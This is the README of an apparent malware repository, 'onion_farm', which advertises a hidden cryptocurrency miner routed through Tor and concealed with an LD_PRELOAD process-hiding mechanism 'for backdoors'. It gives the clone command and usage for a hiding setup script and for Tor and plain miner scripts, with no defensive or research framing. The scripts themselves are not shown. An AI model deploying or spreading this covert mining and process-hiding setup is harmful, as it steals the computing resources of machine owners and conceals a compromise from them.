# onion_farm
Hidden miner via tor and under ld.preload for backdoors

```
git clone https://github.com/0x-raafet/onion_farm.git ; cd onion_farm/ ; chmod +x *
```
cover the miner and hide process
```
./hidsetup.sh
```
tor miner
```
./tormd.sh [numOFcpus]
```
normal miner
```
./mine.sh [numOFcpus]
```
